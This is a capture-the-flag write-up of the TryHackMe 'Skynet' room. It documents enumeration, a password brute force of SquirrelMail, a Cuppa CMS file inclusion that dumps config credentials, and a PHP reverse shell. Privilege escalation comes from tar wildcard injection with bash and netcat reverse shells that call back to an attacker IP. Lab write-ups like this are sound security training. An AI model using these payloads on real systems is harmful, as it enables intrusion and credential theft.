# Tryhackme.com Room : Skynet
`https://tryhackme.com/room/skynet`


# Instance
```
export IP=10.10.108.51
```

# Nmap
```
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: RESP-CODES CAPA UIDL PIPELINING TOP SASL AUTH-RESP-CODE
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: IMAP4rev1 ENABLE have LOGINDISABLEDA0001 more LITERAL+ listed post-login IDLE ID OK SASL-IR Pre-login LOGIN-REFERRALS capabilities
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
MAC Address: 02:57:86:E0:50:80 (Unknown)
```

We `gobuster dir -w /usr/share/wordlists/dirb/common.txt --url http://$IP -x js,php,html,txt,png,jpg` and find
```
/admin (Status: 301)
/config (Status: 301)
/css (Status: 301)
/image.png (Status: 200)
/index.html (Status: 200)
/index.html (Status: 200)
/js (Status: 301)
/server-status (Status: 403)
/squirrelmail (Status: 301)
```

We get a login page at `/squirrelmail`.
`/admin` is forbidden.

We find `SquirrelMail version 1.4.23`

We find a RCE exploit `https://legalhackers.com/videos/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html`

But we need a username & password to execute.

From the question, we know that there is a user `miles`.
We can bruteforce `/squirrelmail` (Maybe we could bruteforce the pop3 server instead ?)

Seems like bruteforcing the pop3 server doesn't work. Doesn't accept plaintext.
Takes forever to bruteforce the squirrelmail page.. Each request takes a long time...

Let's check out the samba server `smbclient -L $IP` :

```
Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

```

We can connect to the anonymous share `smbclient //$IP/anonymous`. We find the files :
```
attention.txt                       N      163  Wed Sep 18 03:04:59 2019
  logs                                D        0  Wed Sep 18 04:42:16 2019
  books                               D        0  Wed Sep 18 04:40:06 2019
```

`attention.txt` contains :
```
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

We can also simply use the file explorer qith the path `smb://10.10.156.140/anonymous` and reach the share via GUI.
In `/logs/log1.txt` we find :
```
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

Which look like a password list.

the `books` folder contains a bunch of .pdf

We can use the password list to bruteforce the `/squirrelmail`.

We tried `patator http_fuzz url=http://$IP/squirrelmail/src/redirect.php 0=pass.txt method=POST body='login_username=miles&js_autodetect_results=1&just_logged_in=1&secretkey=FILE0' -x ignore:fgrep=ERROR -t 2`

But didn't get any hits. I remembered that the share name is `milesdyson` so i tried with this username instead and got a hit `patator http_fuzz url=http://$IP/squirrelmail/src/redirect.php 0=pass.txt method=POST body='login_username=milesdyson&js_autodetect_results=1&just_logged_in=1&secretkey=FILE0' -x ignore:fgrep=ERROR -t 2`

```
cyborg007haloterminator
```

In squirrelmail we have 3 email :
```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

```
01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110
01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111
```

```
i can i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i i can i i i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i . . . . . . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i i i i i everything else . . . . . . . . . . . . . .
balls have 0 to me to me to me to me to me to me to me to me to
you i i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
```

We convert the binary email and get :
```
balls have zero to me to me to me to me to me to me to me to me to
```

Seems lie it's some kind of coded language.
Let's check the samba first and we'll return to this if we don't find anything usefull.
We get a bunch of pdf & a `notes` folder

We find an `important.txt` file :
```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

Seems like we found something at `/45kra24zxs28v3yd`

It's a simple static page, let's gobuster `gobuster dir -w /usr/share/wordlists/dirb/common.txt --url http://$IP/45kra24zxs28v3yd -x js,php,html,txt,png,jpg`
```
/administrator (Status: 301)
/index.html (Status: 200)
/index.html (Status: 200)
```

Actually, it's served via `cuppa CMS`.
We get a login page at `/45kra24zxs28v3yd/administrator`

We find an exploit for cuppa CMS.
```
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion exploits/php/webapps/25971.txt
```

We can access `/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php`

This page is vulnerable to file inclusion (remote & local).

We can use `/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php` to dump configuration file as base64.

Once decoded we get :
```
<?php 
	class Configuration{
		public $host = "localhost";
		public $db = "cuppa";
		public $user = "root";
		public $password = "password123";
		public $table_prefix = "cu_";
		public $administrator_template = "default";
		public $list_limit = 25;
		public $token = "OBqIPqlFWf3X";
		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
		public $upload_default_path = "media/uploadsFiles";
		public $maximum_file_size = "5242880";
		public $secure_login = 0;
		public $secure_login_value = "";
		public $secure_login_redirect = "";
	} 

```

We get the password for the db. We could try to login to the db (Even tho its probably not accessible from outside) and get the username but don't think it's usefull.
We can get a reverse shell and get into the machine.

We create the revershe shell on our machine :
```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.235.153/4444 0>&1'");
```

Then launch an http server :
```
python -m SimpleHTTPServer
```

Than access `/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.235.153:8000/shell.php
`

And we got a shell :D


We get the user flag :
```
cat /home/milesdyson/user.txt                   
7ce5c2109a40f958099283600a9ae807
```

Then we just use netcat to send `linpeas.sh` to the machine in `/dev/shm` and we run it.

Some infos :
```
Linux version 4.8.0-58-generic
```

```
root /sbin/mdam
```

```
Samba running as root
```

Seems like we found something running in the cron :
```
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
```

We can rootlogin in ssh so we might be ale to bruteforce

`Screen` is a SGID. Might be able to exploit.

We can access mail server data at `/var/lib/squirrelmail/data`

We can't modify `/home/milesdyson/backups/backup.sh` since we are not logged in as milesdyson...

Seems like we can't login into `milesdyson`

`backup.sh` contains :
```
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

If we are able to somehow put the flag inside the archive...
Symlinks will be copied as is (Not following) so this is not working..
Can't mount either..

If we could find a way to make `/var/www/html` point to `/root` that would work...

But since we can't write in `/var/www/` I don't find a way to do it...

Actually, i was doing a typo when trying to login with `milesdyson`... Maybe we can bruteforce this login ?

Lol... the login was just
```
miledyson:cyborg007haloterminator
```

Weird can't login via ssh with those credentials but I can login using `su milesdyson` from `www-data` reverse shell.

Now that we're logged in, we can just modify `backup.sh`
OH well.. we don't have write permissions on `backup.sh`...

hmmm... gained nothing from login in `milesdyson`...

Found some priviledge escalation using tar wildcard : `https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/`

We write this : in `/var/www/html`
```
echo "mkfifo /tmp/lhennp; nc 10.10.235.153 8888 0</dev/shm/lhennp | /bin/sh >/dev/shm/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

We get a connection but it's closed immediatly...
Maybe we can try with a different `shell.sh`
The important parts are the `--checkpoint` files that are expanded with `*` and are used as parameters for tar.

We use this as `shell.sh` :
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.235.153/8888 0>&1
```

And we got a root reverse shell:
```
cat /root/root.txt
3f0372db24753accc7179a282cd6a949
```